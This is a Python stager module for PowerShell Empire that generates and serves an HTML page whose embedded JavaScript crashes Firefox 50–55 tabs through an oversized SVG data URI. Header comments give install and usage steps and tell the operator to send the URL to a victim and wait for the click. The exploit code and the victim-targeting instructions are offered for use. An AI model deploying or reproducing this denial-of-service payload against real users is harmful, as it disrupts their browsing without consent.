from lib.common import helpers
import os 

##
# This Stager Only Works With Powershell Empire
##

####
# Stager Name        : Firefox Crash Denial of Service
# Author             : Chaitanya | Twitter : @bofheaded
# Vulnerable Version : Versions 50=<55
# Tested on          : Windows 10 
# Software Link      : http://www.mozilla.org 
###

##
#How To Install
##
#Do Git clone from http://github.com/ChaitanyaHaritash/My-Exploits
#Paste the module into /{path}/Empire/lib/stagers
#$ sudo ./empire

##
#Requirements : 
#1. Apache
#2. Powershell Empire

##
#Usage
##
#(Empire) > listeners
#(Empire) > run
#(Empire) > Set {listener options}
#(Empire) > usestager firefox_50_dos
#(Empire) > set listener {id}
#(Empire: stager/firefox_50_dos) > set OutFile {Recommended[/var/www/html/(filename.html)]}
#(Empire: stager/firefox_50_dos) > execute
#Now pass the URL to the victim using vulnerable browser and wait for his click :) 

#Thanks : Nick-Angel Gimnopoulos(for tesing;)
#
#---SSA[Red-Team] => https://ssa-team.com


source = '''A stack overflow DoS vulnerability affecting Firefox versions 50 through 55 was discovered by Geeknik Labs. This flaw does NOT affect ESR 45 or the latest version of the Tor Browser Bundle. This flaw can be triggered by simply visiting a website with the PoC code embedded in it and requires no further user interaction nor does it require any special privileges. Successful exploitation results in the browser tab crashing.\n
  \n                     
                       --Discoverer : Brian Carpenter
                       --Stager Author : Chaitanya | Twitter : @bofheaded\n 
  \n
                            --MISC :
                            http://tr.0day.today/exploit/27792\n
                                                              www.bugzilla.mozilla.org/show_bug.cgi?id=1322307\n
                                                              https://github.com/ChaitanyaHaritash\n
        '''
class Stager:
 
    def __init__(self, mainMenu, params=[]):
 
        self.info = {
            'Name': 'Firefox 50=<55 crash Denial of Service',    

            'Author': ['Chaitanya | @bofheaded'],
 
            'Description': (source),
 
        }
 
        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'File to output HTML.(/var/www/html/)',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
 
        # save off a copy of the mainMenu object to access external functionality
        self.mainMenu = mainMenu
 
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value
 
 
    def generate(self):
 
        try:    
            # extract all of our options
            outfil = self.options['OutFile']['Value']
            if outfil == "":
                print helpers.color("[!] Error in launcher command generation.")
                return ""
            else:
                   if "/var/www/html/" in outfil:  
                         print ""
                         self.do = os.system('service apache2 start')
                         print ""
                         print "[+] Now just pass the malicious URL redirecting to your html file to the Victim [+]"
                         code = ('''

<html>
<head></head>
<body>
<script>
function done() {
}
         
var x = '';
for (i=0; i<500000; ++i)
x += '<a>';
var uri = 'data:image/svg+xml,' + x;
var i = new Image();
i.src = uri;
</script>
</body>
</html>

                            ''')
                         return code 
                   else:  
                        code = ('''

<html>
<head></head>
<body>
<script>
function done() {
}
         
var x = '';
for (i=0; i<500000; ++i)
x += '<a>';
var uri = 'data:image/svg+xml,' + x;
var i = new Image();
i.src = uri;
</script>
</body>
</html>

                        ''')
            return code
            print "[~] I'm not triggring apache server as random path as been set"
        except:
            pass    